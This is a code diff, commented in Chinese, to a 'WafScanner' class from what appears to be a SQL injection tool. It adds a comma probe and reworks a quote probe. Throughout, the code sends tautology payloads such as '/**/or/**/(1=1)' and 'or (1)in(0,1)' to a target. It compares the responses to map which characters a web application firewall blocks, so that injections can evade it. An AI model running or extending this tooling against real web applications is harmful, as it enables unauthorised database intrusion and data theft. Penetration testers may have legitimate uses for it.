@@ -141,6 +141,7 @@ class WafScanner:
             "--": self._probe_dashdash,
             "/*": self._probe_inline,
             ";": self._probe_semicolon,
+            ",": self._probe_comma,
         }
         if token in special:
             special[token](report, token, pre, tail)
@@ -199,9 +200,10 @@ class WafScanner:
         if cls == "error":
             self._record(report, token, "符号", "error")
             return
-        # 自参照法：无引号恒真 vs 含引号恒真（'a'='a'）页面比对
-        r_ref = self.s.request_value(f"{pre}/**/and/**/1=1{tail}")
-        r_quote = self.s.request_value(f"{pre}/**/and/**/'a'='a'{tail}")
+        # 自参照法：无引号恒真（or）vs 含引号恒真（'a'='a'）页面比对
+        # （用 or 而非 and——and 被滤环境下 and 参照自身即拦截页，恒相似导致误判可用）
+        r_ref = self.s.request_value(f"{pre}/**/or/**/(1=1){tail}")
+        r_quote = self.s.request_value(f"{pre}/**/or/**/('a'='a'){tail}")
         if r_ref.status_code > 0 and similarity(r_ref, r_quote) >= 0.98 \
                 and r_ref.status_code == r_quote.status_code:
             self._record(report, token, "符号", "error",
@@ -268,6 +270,20 @@ class WafScanner:
                          note="（order by 3 未报错，/**/ 疑似被剥离或失效）")
         else:
             self._record(report, token, "符号", "other")
+
+    def _probe_comma(self, report: WafReport, token: str, pre: str, tail: str):
+        """逗号语义探针：or (1)in(0,1) 恒真 vs or (1)in(0) 恒假。
+        含逗号恒真与无逗号恒真(or 1=1)页面一致 = 可用；偏离 = 被滤。"""
+        from .detector import apply_form
+        form = getattr(self.inj, "form", "classic") or "classic"
+        r_ref = self.s.request_value(f"{pre}{apply_form(' or (1=1)', form)}{tail}")
+        r_comma = self.s.request_value(f"{pre}{apply_form(' or (1)in(0,1)', form)}{tail}")
+        if r_ref.status_code > 0 and similarity(r_comma, r_ref) >= 0.95                 and r_comma.status_code == r_ref.status_code:
+            self._record(report, token, "符号", "error",
+                         note="（in(0,1) 恒真与 or 1=1 一致，逗号可用）", trust=True)
+        else:
+            self._record(report, token, "符号", "base",
+                         note="（含逗号恒真失败，逗号被过滤）", trust=True)
 
     def _probe_semicolon(self, report: WafReport, token: str, pre: str, tail: str):
         """1';SET @a=1# → 正常=分号通过（SET 合法执行）；报错=被剥。
